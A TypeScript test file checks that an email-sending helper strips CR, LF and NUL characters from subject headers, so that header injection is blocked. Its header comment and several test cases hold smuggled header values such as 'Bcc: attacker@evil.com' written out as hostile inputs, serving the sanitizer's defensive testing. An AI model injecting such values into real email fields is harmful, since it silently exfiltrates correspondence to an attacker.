/**
 * M8 regression - email header injection via CR/LF in `Subject:`.
 * If a template variable contains `\r\n`, RFC 5322 lets the
 * remainder be interpreted as a fresh header line. A hostile
 * lead's businessName like `Test\r\nBcc: attacker@evil.com` could
 * silently exfiltrate every outgoing email about that lead.
 */
import { describe, expect, it } from "vitest";
import { scrubHeader } from "@/lib/email/send";

describe("M8 - scrubHeader", () => {
  it("removes literal \\r and \\n", () => {
    expect(scrubHeader("Hello\r\nBcc: evil@x.com")).toBe(
      "Hello  Bcc: evil@x.com",
    );
  });

  it("removes lone \\r", () => {
    expect(scrubHeader("A\rB")).toBe("A B");
  });

  it("removes lone \\n", () => {
    expect(scrubHeader("A\nB")).toBe("A B");
  });

  it("removes \\0 NUL", () => {
    expect(scrubHeader("A\0B")).toBe("A B");
  });

  it("trims trailing whitespace", () => {
    expect(scrubHeader("Hello  \r\n\r\n")).toBe("Hello");
  });

  it("does not touch a normal subject", () => {
    expect(scrubHeader("Welcome to LeadAC, Acme!")).toBe(
      "Welcome to LeadAC, Acme!",
    );
  });

  it("does not introduce CR/LF when the input has none", () => {
    const out = scrubHeader("just-a-subject");
    expect(out).not.toMatch(/[\r\n\0]/);
    expect(out).toBe("just-a-subject");
  });

  it("collapses a multi-line injection completely", () => {
    const malicious =
      "Quote for Acme\r\nBcc: attacker@evil.com\r\nReply-To: attacker@evil.com";
    const cleaned = scrubHeader(malicious);
    expect(cleaned).not.toMatch(/[\r\n]/);
    // The data is preserved (just flattened) so server-side
    // logging still shows what was attempted.
    expect(cleaned).toContain("attacker@evil.com");
  });
});
